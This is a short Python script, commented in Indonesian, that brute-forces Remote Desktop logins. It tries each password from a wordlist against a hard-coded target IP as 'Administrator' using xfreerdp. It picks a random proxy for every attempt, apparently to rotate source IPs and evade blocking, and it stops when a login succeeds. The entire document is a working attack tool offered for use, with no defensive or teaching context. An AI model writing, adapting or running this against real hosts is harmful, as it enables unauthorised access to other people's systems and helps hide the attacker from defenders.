import time
import subprocess
import random

TARGET_IP = "192.168.1.100"  # ganti dengan IP target
USERNAME = "Administrator"   # atau user lain

def load_proxies():
    with open("proxies.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]

def load_passwords():
    with open("passwords.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]

def try_rdp_with_proxy(proxy, password):
    print(f"[+] Mencoba {USERNAME}:{password} melalui {proxy}")
    
    # Format proxy untuk proxychains
    proxy_env = {
        "ALL_PROXY": proxy
    }

    try:
        result = subprocess.run([
            "xfreerdp", f"/u:{USERNAME}", f"/p:{password}", f"/v:{TARGET_IP}",
            "/cert:ignore", "/timeout:3000"  # biar cepat gagal kalau salah
        ], env=proxy_env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)

        output = result.stdout.decode()
        if "connected to" in output.lower():
            print(f"[!] LOGIN BERHASIL: {USERNAME}:{password}")
            return True
    except subprocess.TimeoutExpired:
        print("[-] Timeout")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

def main():
    proxies = load_proxies()
    passwords = load_passwords()

    for password in passwords:
        proxy = random.choice(proxies)
        if try_rdp_with_proxy(proxy, password):
            break
        time.sleep(2)  # ganti IP tiap 2 detik

if __name__ == "__main__":
    main()
